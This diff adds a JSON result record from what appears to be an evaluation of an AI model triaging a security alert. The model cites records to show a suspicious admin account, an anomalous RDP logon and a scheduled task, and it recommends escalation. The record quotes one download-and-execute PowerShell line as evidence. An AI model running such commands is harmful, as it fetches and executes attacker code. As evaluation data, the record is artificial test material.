@@ -1,0 +1,103 @@
+{
+ "run_id": "A__T047__C2__20261115T045957Z",
+ "config": "A",
+ "scenario_id": "T047",
+ "condition": "C2",
+ "model": "gpt-6-luna",
+ "n_records_in_view": 178,
+ "system": "You are a security investigator reviewing an alert. Base every claim only on the evidence available to you. Cite the record IDs that support each observation.",
+ "task_chars": 74083,
+ "attempts": [
+  {
+   "answer": "{\n  \"assessment\": \"malicious\",\n  \"confidence\": 0.99,\n  \"supporting_observations\": [\n    {\n      \"claim\": \"The domain controller recorded creation of the sysmaint account at 13:43:55 UTC, attributed to sam.okafor.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T047-00081\"]\n    },\n    {\n      \"claim\": \"About one second later, sysmaint was added to the domain Administrators group.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T047-00082\"]\n    },\n    {\n      \"claim\": \"Before the account creation, WS-LMARTINS-01 accepted an RDP logon for sam.okafor from 203.0.113.250. The environment says remote administration is only done from WS-SOKAFOR-01 and there is no VPN, so this access is inconsistent with the stated practice.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\"T047-00063\", \"T047-00065\"]\n    },\n    {\n      \"claim\": \"At 13:43:57 UTC, a task was registered on WS-LMARTINS-01 under sam.okafor. Its PowerShell action uses -nop, a hidden window, and an encoded command that decodes to `IEX (iwr http://203.0.113.250/a.ps1)`.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T047-00083\"]\n    },\n    {\n      \"claim\": \"The task's download address, 203.0.113.250, matches the source address of the preceding RDP connection.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\"T047-00063\", \"T047-00083\"]\n    },\n    {\n      \"claim\": \"Creating an Administrator-group account named sysmaint and registering a task that downloads and executes a script from the same address used for the unusual RDP connection strongly supports malicious activity, rather than the documented temporary-account or workstation-patching practices.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\"T047-00063\", \"T047-00065\", \"T047-00081\", \"T047-00082\", \"T047-00083\"]\n    }\n  ],\n  \"known_telemetry_limitations\": [\n    \"The task-registration record establishes the action configured, but the provided records do not show whether the task ran or whether the script was successfully downloaded or executed.\",\n    \"The provided network record for the proxy connection contains connection metadata, not the HTTP request or response contents.\",\n    \"The records do not establish who controlled the source address or whether the sam.okafor credentials were compromised.\"\n  ],\n  \"claims_not_established\": [\n    \"Whether the task executed and what the downloaded script contained or did.\",\n    \"Whether sam.okafor personally performed these actions, or whether the account or session was compromised.\",\n    \"Whether sysmaint was subsequently used for additional activity beyond its creation and Administrator-group addition.\"\n  ],\n  \"recommended_action\": \"escalate\",\n  \"additional_evidence_needed\": [\n    \"Collect endpoint task execution, PowerShell, process, and file telemetry from WS-LMARTINS-01, including any access to the task's URL.\",\n    \"Obtain proxy and network records for 203.0.113.250, including request and response data if retained.\",\n    \"Review authentication and session telemetry for sam.okafor and sysmaint, and investigate the source and destination of the RDP connection.\",\n    \"Review subsequent domain account, group membership, and authentication activity involving sysmaint; preserve relevant host and domain-controller evidence.\"\n  ]\n}",
+   "valid": true,
+   "validation_errors": [],
+   "model_returned": "gpt-6-luna",
+   "finish_reason": "stop",
+   "usage": {
+    "input": 27769,
+    "output": 2016,
+    "reasoning": 1205
+   }
+  }
+ ],
+ "error": null,
+ "parsed": {
+  "assessment": "malicious",
+  "confidence": 0.99,
+  "supporting_observations": [
+   {
+    "claim": "The domain controller recorded creation of the sysmaint account at 13:43:55 UTC, attributed to sam.okafor.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T047-00081"
+    ]
+   },
+   {
+    "claim": "About one second later, sysmaint was added to the domain Administrators group.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T047-00082"
+    ]
+   },
+   {
+    "claim": "Before the account creation, WS-LMARTINS-01 accepted an RDP logon for sam.okafor from 203.0.113.250. The environment says remote administration is only done from WS-SOKAFOR-01 and there is no VPN, so this access is inconsistent with the stated practice.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "T047-00063",
+     "T047-00065"
+    ]
+   },
+   {
+    "claim": "At 13:43:57 UTC, a task was registered on WS-LMARTINS-01 under sam.okafor. Its PowerShell action uses -nop, a hidden window, and an encoded command that decodes to `IEX (iwr http://203.0.113.250/a.ps1)`.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T047-00083"
+    ]
+   },
+   {
+    "claim": "The task's download address, 203.0.113.250, matches the source address of the preceding RDP connection.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "T047-00063",
+     "T047-00083"
+    ]
+   },
+   {
+    "claim": "Creating an Administrator-group account named sysmaint and registering a task that downloads and executes a script from the same address used for the unusual RDP connection strongly supports malicious activity, rather than the documented temporary-account or workstation-patching practices.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "T047-00063",
+     "T047-00065",
+     "T047-00081",
+     "T047-00082",
+     "T047-00083"
+    ]
+   }
+  ],
+  "known_telemetry_limitations": [
+   "The task-registration record establishes the action configured, but the provided records do not show whether the task ran or whether the script was successfully downloaded or executed.",
+   "The provided network record for the proxy connection contains connection metadata, not the HTTP request or response contents.",
+   "The records do not establish who controlled the source address or whether the sam.okafor credentials were compromised."
+  ],
+  "claims_not_established": [
+   "Whether the task executed and what the downloaded script contained or did.",
+   "Whether sam.okafor personally performed these actions, or whether the account or session was compromised.",
+   "Whether sysmaint was subsequently used for additional activity beyond its creation and Administrator-group addition."
+  ],
+  "recommended_action": "escalate",
+  "additional_evidence_needed": [
+   "Collect endpoint task execution, PowerShell, process, and file telemetry from WS-LMARTINS-01, including any access to the task's URL.",
+   "Obtain proxy and network records for 203.0.113.250, including request and response data if retained.",
+   "Review authentication and session telemetry for sam.okafor and sysmaint, and investigate the source and destination of the RDP connection.",
+   "Review subsequent domain account, group membership, and authentication activity involving sysmaint; preserve relevant host and domain-controller evidence."
+  ]
+ },
+ "status": "VALID",
+ "faithfulness_precheck": {
+  "n_cited": 12,
+  "n_missing": 0,
+  "missing": []
+ },
+ "duration_s": 21.6
+}
